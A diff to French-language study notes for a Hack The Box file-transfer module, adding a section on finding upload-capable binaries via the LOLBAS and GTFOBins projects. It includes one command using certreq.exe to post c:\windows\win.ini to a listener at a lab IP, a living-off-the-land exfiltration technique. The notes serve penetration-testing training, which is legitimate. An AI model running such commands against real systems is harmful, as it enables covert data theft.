@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T15:41:02.245Z
+date: 2025-05-04T15:47:07.347Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -896,5 +896,18 @@ Les binaires **Living off the Land** peuvent être utilisés pour effectuer des 
 
 ### Using the LOLBAS and GTFOBins Project
 
+#### LOLBAS
+
+Pour rechercher sur le projet LOLBAS, il est possible d'effectuer une recherche. Par exemple, pour voir tous les binaires permettant l'envoi de fichiers: `/upload`.
+
+Par exemple, pour envoyer un fichier avec certreq.exe (C:\Windows\system32\certreq.exe) après avoir créer un listener:
+
+```
+certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+```
+
+#### GTFOBins
+
+Pour rechercher sur le projet GTFOBins, il est possible d'effectuer une recherche. Par exemple, pour voir tous les binaires permettant l'envoi de fichiers: `+file download`.
 
 
